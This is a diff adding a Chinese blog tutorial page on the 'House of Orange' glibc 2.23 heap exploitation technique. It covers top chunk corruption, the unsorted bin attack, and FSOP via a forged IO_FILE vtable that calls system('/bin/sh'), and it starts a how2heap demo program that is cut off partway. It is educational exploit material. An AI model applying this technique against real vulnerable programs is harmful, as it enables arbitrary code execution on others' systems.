@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="1234567title: House Of Orangedate: 2025-6-17 13:04:54categories:- PWNtags:- heap- House Of Orange    House Of OrangeHouse Of Orange 简介该利用方式是最早的一种 IO 利用方式之一，适用条件为glibc 2.23，开启了堆与 IO 组合利用的先河。 当程序中没有free">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN好难学">
+<meta property="og:url" content="http://example.com/2025/07/19/House_of_Orange/index.html">
+<meta property="og:site_name" content="PWN好难学">
+<meta property="og:description" content="1234567title: House Of Orangedate: 2025-6-17 13:04:54categories:- PWNtags:- heap- House Of Orange    House Of OrangeHouse Of Orange 简介该利用方式是最早的一种 IO 利用方式之一，适用条件为glibc 2.23，开启了堆与 IO 组合利用的先河。 当程序中没有free">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250716224252645.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250717165306240.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250719141215474.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250719141304519.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250719142409632.png">
+<meta property="og:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250719143234598.png">
+<meta property="article:published_time" content="2025-07-19T07:23:38.235Z">
+<meta property="article:modified_time" content="2025-07-19T07:22:54.876Z">
+<meta property="article:author" content="Fa1lSnow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/Fa1lSnow/pic/raw/master/20250716224252645.png">
+
+
+<link rel="canonical" href="http://example.com/2025/07/19/House_of_Orange/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/07/19/House_of_Orange/","path":"2025/07/19/House_of_Orange/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | PWN好难学</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">PWN好难学</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> 落雪的小玩意</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#House-Of-Orange"><span class="nav-number">1.</span> <span class="nav-text">House Of Orange</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Orange-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">House Of Orange 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.2.</span> <span class="nav-text">使用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="nav-number">1.4.</span> <span class="nav-text">实例分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B7%E4%BE%8B%EF%BC%9Ahow2heap%E4%B8%AD%E7%9A%84-House-of-orange"><span class="nav-number">1.4.1.</span> <span class="nav-text">样例：how2heap中的 House of orange</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">源码</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fa1lSnow"
+      src="/uploads/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Fa1lSnow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/19/House_of_Orange/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Fa1lSnow">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-07-19 15:23:38 / Modified: 15:22:54" itemprop="dateCreated datePublished" datetime="2025-07-19T15:23:38+08:00">2025-07-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">title: House Of Orange</span><br><span class="line">date: 2025-6-17 13:04:54</span><br><span class="line">categories:</span><br><span class="line">- PWN</span><br><span class="line">tags:</span><br><span class="line">- heap</span><br><span class="line">- House Of Orange</span><br></pre></td></tr></table></figure>
+
+<meta name="referrer" content="no-referrer" />
+
+<h1 id="House-Of-Orange"><a href="#House-Of-Orange" class="headerlink" title="House Of Orange"></a>House Of Orange</h1><h2 id="House-Of-Orange-简介"><a href="#House-Of-Orange-简介" class="headerlink" title="House Of Orange 简介"></a>House Of Orange 简介</h2><p>该利用方式是最早的一种 IO 利用方式之一，<strong>适用条件为glibc 2.23</strong>，开启了堆与 IO 组合利用的先河。</p>
+<p>当程序中没有free的情况下，利用<strong>溢出覆盖Topchunk</strong>，然后申请<strong>大于topchunk的堆块</strong>，这个时候就会<strong>把原来的topchunk放入unsorted bin</strong>，后续通过 **Unsorted Bin Attack + FSOP **进行攻击。</p>
+<h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><ul>
+<li><p>堆溢出（读写）</p>
+</li>
+<li><p>glibc2.23</p>
+<blockquote>
+<p><strong>【重要版本提示】</strong><br>glibc 2.26 后 malloc_printerr 不再调用 _IO_flush_all_lockp（commit 91e7cf98）<br>glibc 2.24 引入 _IO_FILE 虚表白名单机制，无法通过修改虚表为堆地址来进行攻击</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>如简介中所说，House Of ORange 的第一步在于，程序中没有提供free的情况下，我们要得到一个进入unsorted bin 的chunk进行后续的泄露。我们来详细分析一个这个过程。对于主arena 和 非主arnea 的处理方式略有不同，我们这里仅讨论主 arena 的情况。</p>
+<p>我们知道<code>malloc</code>函数底层会执行<code>_int_malloc</code>函数，在<code>_int_malloc</code>函数中，当我们申请内存的时候，他会依次扫描tcache（如果有的话）、fast bin 、unsorted bin、small bin、large bin 是否有符合要求的堆块，如果都没有，<code>_int_malloc</code>就会试图从**top chunk **中尝试分配，但如果 top chunk 的大小仍无法满足要求，就会执行如下分支</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//av是指向mstate（memory state）的指针，nb是请求的大小</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>核心处理放在了<code>sysmalloc</code>函数，我们进一步分析</p>
+<p>在<code>sysmalloc</code>中，当我们申请的内存超过mmap阈值（默认是128K）且mmap申请的内存块数量未超过最大数量（默认为65536）的时候会使用mmap来分配内存（这部分不是重点，就不过多介绍了）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (MMAP_AS_MORECORE_SIZE)) &#123;</span><br><span class="line">    size = MMAP_AS_MORECORE_SIZE; <span class="comment">// 默认 1MB</span></span><br><span class="line">    <span class="type">char</span> *mbrk = (<span class="type">char</span> *) (MMAP (<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>sysmalloc</code>函数中当申请的内存<strong>未达到mmap的阈值</strong>，会尝试通过brk来扩展内存，如果<strong>新分配的内存和原来的 top chunk 连续</strong>，就会扩展 top chunk ，相关处理如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123; <span class="comment">/* av == main_arena */</span></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize);</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/* 计算扩展大小 */</span></span><br><span class="line">  size = nb + mp_.top_pad + MINSIZE;</span><br><span class="line">  <span class="keyword">if</span> (contiguous(av))</span><br><span class="line">    size -= old_size; <span class="comment">// 如果堆连续，减去旧 top 的大小</span></span><br><span class="line">  size = ALIGN_UP(size, pagesize); <span class="comment">// 对齐到页大小</span></span><br><span class="line"></span><br><span class="line">  brk = (<span class="type">char</span> *) (MORECORE(size)); <span class="comment">// 调用 sbrk 扩展堆</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (brk != (<span class="type">char</span> *)(MORECORE_FAILURE)) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* 如果新内存与 old_top 相邻，直接合并 */</span></span><br><span class="line">    <span class="keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="type">char</span> *)(MORECORE_FAILURE)) &#123;</span><br><span class="line">      set_head(old_top, (size + old_size) | PREV_INUSE); <span class="comment">// 合并为新 top</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>倘若<strong>内存不连续</strong>，无法扩展，就会把原来的top chunk 通过调用<code>_int_free</code>函数放入 unsorted bin 中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   ....</span><br><span class="line">   <span class="comment">/* 非连续内存处理 */</span></span><br><span class="line">      front_misalign = (INTERNAL_SIZE_T) chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">      <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">        aligned_brk += correction;</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">/* 插入围栏块 */</span></span><br><span class="line">      old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">      set_head(old_top, old_size | PREV_INUSE);</span><br><span class="line">      chunk_at_offset(old_top, old_size)-&gt;size = (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line">      chunk_at_offset(old_top, old_size + <span class="number">2</span> * SIZE_SZ)-&gt;size = (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 如果 old_size &gt;= MINSIZE，释放到 unsorted bin */</span></span><br><span class="line">      <span class="keyword">if</span> (old_size &gt;= MINSIZE) &#123;</span><br><span class="line">        _int_free(av, old_top, <span class="number">1</span>); <span class="comment">// 释放 old_top</span></span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们的 top chunk 的大小是我们通过溢出等方法<strong>修改的</strong>，所以执行到<code>sysmalloc</code>的时候brk分配的<strong>内存必然和当前的top chunk 是不连续的</strong>，因此 top chunk 必然会被放入 unsorted bin 以便后续的泄露</p>
+<p>获取libc之后，就可以开始进行 unsorted bin attack 了，我们通过 unsort bin attack 去劫持IO来进行 FSOP</p>
+<p>FSOP的核心是<strong>劫持IO_FILE结构体</strong>。使之落在我们可控的内存上。这就意味着我们是可以控制vtable的，<strong>我们将vtable中的_IO_overflow函数地址改成system地址即可</strong>，而这个函数的第一个参数就是IO_FILE结构体的地址。如果我们让IO_FILE结构体中的flags成员为&#x2F;bin&#x2F;sh字符串，那么当<strong>执行exit函数</strong>或者<strong>libc执行abort流程时</strong>或者<strong>程序从main函数返回时</strong>触发了_IO_flush_all_lockp 即可 get shell</p>
+<p>正常的IO链表结构是这样的</p>
+<p><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250716224252645.png" alt="image-20250716224252590"></p>
+<p>我们布局之后的结构是这样的</p>
+<p><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250717165306240.png" alt="image-20250717165306175"></p>
+<p>下面我们来看一下，我们成功布局需要绕过的一些检测</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">)</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br></pre></td></tr></table></figure>
+
+<p>嗯……看着很晕……</p>
+<p>其实就是分了两种情况，</p>
+<p><strong>情况1</strong>：普通文本模式下的刷新判断（ASCII流）</p>
+<ul>
+<li><code>fp-&gt;_mode &lt;= 0</code>：表示 <strong>处于字节流模式</strong>，即不是宽字符流。</li>
+<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>：<ul>
+<li>表示写缓冲区中有 <strong>未刷新的数据</strong>。</li>
+<li><code>write_ptr</code> 指向当前写入位置，<code>write_base</code> 是缓冲区起始地址。</li>
+</ul>
+</li>
+</ul>
+<p>表示这个 <code>FILE</code> 结构体的 <strong>写缓冲区有内容需要 flush</strong>。</p>
+<p>**情况2：**宽字符模式（<code>wchar_t</code>）下的刷新判断</p>
+<p>这个条件只在：</p>
+<ul>
+<li>内部使用 glibc（定义了 <code>_LIBC</code>）或</li>
+<li>支持 <code>wchar_t</code> 流（定义了 <code>_GLIBCPP_USE_WCHAR_T</code>）时编译</li>
+</ul>
+<p>才启用。</p>
+<p><strong>条件含义：</strong></p>
+<ul>
+<li><code>_IO_vtable_offset(fp) == 0</code>：确保该 <code>FILE</code> 对象是标准的 libio 类型（不是用户扩展或替换的）。</li>
+<li><code>fp-&gt;_mode &gt; 0</code>：表示是 <strong>宽字符流模式</strong>。</li>
+<li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; _IO_write_base</code>：<ul>
+<li>宽字符缓冲区中也有 <strong>尚未写出的内容</strong>。</li>
+</ul>
+</li>
+</ul>
+<p>一般来说，我们只需要镇定情况1就可以了，绕过方法非常简单。</p>
+<blockquote>
+<p><strong>值得注意的是</strong></p>
+<p>House Of Orange 的攻击链不一定会成功，原因很简单，<code>aboet</code>在调用<code>_IO_flush_all_lockp</code>的时候，会<strong>遍历 <em>IO_FILE_plus</em> 结构体链表</strong>，对每个 IO 流进行<strong>依次刷新</strong>，但是我们布局之后，破坏了 stderr 会导致刷新 stderr 的时候崩溃，所以只有当布局之后的假 stderr 不进行刷新的时候才能成功攻击。</p>
+<p>第一个结构体的mode字段是main_arena+88+0xc0处的数据决定的 ，这个值会因为libc地址随机而变动。（mode字段是<strong>四字节</strong>）</p>
+</blockquote>
+<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="样例：how2heap中的-House-of-orange"><a href="#样例：how2heap中的-House-of-orange" class="headerlink" title="样例：how2heap中的 House of orange"></a>样例：how2heap中的 House of orange</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    House of Orange 攻击演示</span></span><br><span class="line"><span class="comment">    利用堆溢出篡改 _IO_list_all 指针</span></span><br><span class="line"><span class="comment">    需要泄漏堆地址和 libc 地址</span></span><br><span class="line"><span class="comment">    原理参考：http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟已知 system 函数地址的场景</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 攻击前提：堆溢出可篡改 Top Chunk 元数据</span></span><br><span class="line">    <span class="comment">// 初始堆空间完全属于 Top Chunk</span></span><br><span class="line">    <span class="comment">// 每次分配会从 Top Chunk 分割内存，导致其逐渐缩小</span></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【重要版本提示】</span></span><br><span class="line">    <span class="comment">// glibc 2.26 后 malloc_printerr 不再调用 _IO_flush_all_lockp（commit 91e7cf98）</span></span><br><span class="line">    <span class="comment">// glibc 2.24 引入 _IO_FILE 虚表白名单机制，无法通过修改虚表为堆地址来进行攻击</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ┌───────────────────────┐</span></span><br><span class="line">    <span class="comment">// │ 第一阶段：堆布局构造   │</span></span><br><span class="line">    <span class="comment">// └───────────────────────┘</span></span><br><span class="line">    <span class="comment">// 1. 初始分配 0x400-0x10 字节（模拟堆使用）</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 修改 Top Chunk 元数据</span></span><br><span class="line">    <span class="comment">// 原始 Top Chunk 大小为 0x21000（页对齐要求）</span></span><br><span class="line">    <span class="comment">// 分配后剩余 0x20C00 